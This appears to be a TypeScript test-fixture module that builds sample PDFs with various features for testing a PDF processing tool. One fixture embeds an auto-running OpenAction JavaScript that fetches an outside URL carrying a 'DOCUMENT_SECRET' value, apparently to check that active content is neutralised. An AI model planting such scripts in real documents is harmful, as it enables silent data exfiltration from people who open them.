import { PDFDocument, PDFName, PDFString, degrees } from 'pdf-lib';
import { createCanvas } from '@napi-rs/canvas';
import createModule from '@neslinesli93/qpdf-wasm';
import { resolve } from 'node:path';

export async function encryptedFixture(bytes: Uint8Array, password: string) {
  const module = await createModule({
    locateFile: () => resolve('node_modules/@neslinesli93/qpdf-wasm/dist/qpdf.wasm'),
  });
  const fs = module.FS as unknown as {
    writeFile(path: string, bytes: Uint8Array): void;
    readFile(path: string): Uint8Array;
    unlink(path: string): void;
  };
  fs.writeFile('/in.pdf', bytes);
  try {
    if (
      module.callMain([
        '/in.pdf',
        '--encrypt',
        `--user-password=${password}`,
        '--owner-password=fixture-owner-not-empty',
        '--bits=256',
        '--',
        '/out.pdf',
      ]) !== 0
    )
      throw new Error('Fixture encryption failed');
    return Buffer.from(fs.readFile('/out.pdf'));
  } finally {
    fs.unlink('/in.pdf');
    try {
      fs.unlink('/out.pdf');
    } catch {
      /* No output. */
    }
  }
}

export async function featurePdf(
  feature:
    | 'form'
    | 'uri'
    | 'internal'
    | 'labels'
    | 'attachment'
    | 'tags'
    | 'bookmarks'
    | 'active'
    | 'plain',
) {
  const doc = await PDFDocument.create();
  const a = doc.addPage([400, 500]),
    b = doc.addPage([600, 400]);
  a.drawText('FIRST', { x: 20, y: 450 });
  b.drawText('SECOND', { x: 20, y: 350 });
  if (feature === 'form') {
    const field = doc.getForm().createTextField('customer');
    field.setText('Alice');
    field.addToPage(a, { x: 30, y: 50, width: 150, height: 30 });
  }
  if (feature === 'uri' || feature === 'internal') {
    const action =
      feature === 'uri'
        ? { A: { S: 'URI', URI: PDFString.of('https://example.com/') } }
        : { Dest: [b.ref, PDFName.of('Fit')] };
    a.node.set(
      PDFName.of('Annots'),
      doc.context.obj([
        doc.context.register(
          doc.context.obj({ Type: 'Annot', Subtype: 'Link', Rect: [10, 10, 90, 30], ...action }),
        ),
        doc.context.register(
          doc.context.obj({
            Type: 'Annot',
            Subtype: 'Text',
            Rect: [100, 10, 120, 30],
            Contents: PDFString.of('Keep this note'),
          }),
        ),
      ]),
    );
  }
  if (feature === 'labels')
    doc.catalog.set(
      PDFName.of('PageLabels'),
      doc.context.obj({ Nums: [0, { S: 'r' }, 1, { S: 'D', St: 7 }] }),
    );
  if (feature === 'attachment')
    await doc.attach(new TextEncoder().encode('Keep attachment'), 'note.txt');
  if (feature === 'tags')
    doc.catalog.set(
      PDFName.of('StructTreeRoot'),
      doc.context.obj({ Type: 'StructTreeRoot', K: [] }),
    );
  if (feature === 'bookmarks')
    doc.catalog.set(PDFName.of('Outlines'), doc.context.obj({ Type: 'Outlines', Count: 0 }));
  if (feature === 'active') {
    doc.catalog.set(
      PDFName.of('OpenAction'),
      doc.context.obj({
        S: 'JavaScript',
        JS: PDFString.of(
          "fetch('https://example.com/DOCUMENT_SECRET'); throw new Error('DOCUMENT_SECRET')",
        ),
      }),
    );
    doc.setTitle('DOCUMENT_SECRET');
  }
  return Buffer.from(await doc.save());
}
export async function rotatedBlank() {
  const doc = await PDFDocument.create();
  for (const angle of [0, 90, 180, 270]) {
    const p = doc.addPage([600, 500]);
    p.setMediaBox(30, 20, 600, 500);
    // Extends beyond MediaBox: rendering must use the intersection.
    p.setCropBox(10, 50, 550, 400);
    p.setRotation(degrees(angle));
  }
  return Buffer.from(await doc.save());
}
export function centeredSignature() {
  const canvas = createCanvas(200, 100),
    ctx = canvas.getContext('2d');
  ctx.fillStyle = '#ff0000';
  ctx.fillRect(0, 0, 200, 100);
  return canvas.toBuffer('image/png');
}
